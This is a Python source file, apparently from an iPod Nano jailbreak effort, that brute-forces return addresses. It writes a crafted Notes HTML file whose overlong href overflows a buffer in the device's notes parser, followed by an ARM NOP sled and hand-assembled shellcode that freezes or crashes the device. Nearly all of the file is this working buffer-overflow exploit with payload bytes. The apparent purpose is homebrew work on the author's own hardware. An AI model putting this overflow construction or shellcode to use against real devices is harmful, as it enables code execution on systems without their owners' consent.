import display
import struct
import time

#You shouldn't need to change these two
FREEZEPAYLOAD = struct.pack("<8I", 0xe3a030d3, 0xe121f003, 0xe3a03000, 0xe3a025f2,
                                   0xe3a010a5, 0xe5821000, 0xe2511001, 0xeafffffd)
CRASHPAYLOAD = struct.pack("<8I", 0xe3a030d3, 0xe121f003, 0xe3a03000, 0xe3a025f2,
                                  0xe3a010a5, 0xe5821000, 0xe51ff004, 0x41414141)

def try_address(nanotron, address, irc = None):
    global FREEZEPAYLOAD, CRASHPAYLOAD
    display.myprint ("Testing %8x..." % address)
    nanotron.disk_mode(irc)
    writeNote(FREEZEPAYLOAD, address, nanotron.IPODPATH)
    time.sleep(3) #wait for note to be written
    nanotron.reboot(irc)
    time.sleep(35) #Waiting for boot (my measurings said 33. Farthen)
    nanotron.diskmodecombo(3) #Pressing diskmode combo to see if it eventually crashed
    time.sleep(4) #Wait for diskmode to appear
    status1 = nanotron.get_status()
    if status1 == 0:
        print_status(address, status1, irc=irc) #crashed
        return
    if status1 == 2: nanotron.disk_mode(irc) #enter disk mode if frozen
    writeNote(CRASHPAYLOAD, address, nanotron.IPODPATH)
    time.sleep(3) #wait for note to be written
    nanotron.reboot(irc)
    status2 = nanotron.get_status()
    display.print_status(address, status1, status2, irc)
    nanotron.disk_mode(irc)
    
def writeNote(payload, addr, path):
  pointer = "00000000%x" % addr
  pointer = "%" + pointer[-2:] + "%" + pointer[-4:-2] + "%" + pointer[-6:-4] + "%" + pointer[-8:-6]
  data = "<a href=\"" + ("A" * 256) + pointer * 64 + "\">a</a>"
  data += struct.pack("<I", 0xe1a01001) * ((4096 - len(data) - len(payload)) / 4) + payload
  outfile = open(path + "/Notes/nanotron.htm", "wb")
  outfile.write(data)
  outfile.close()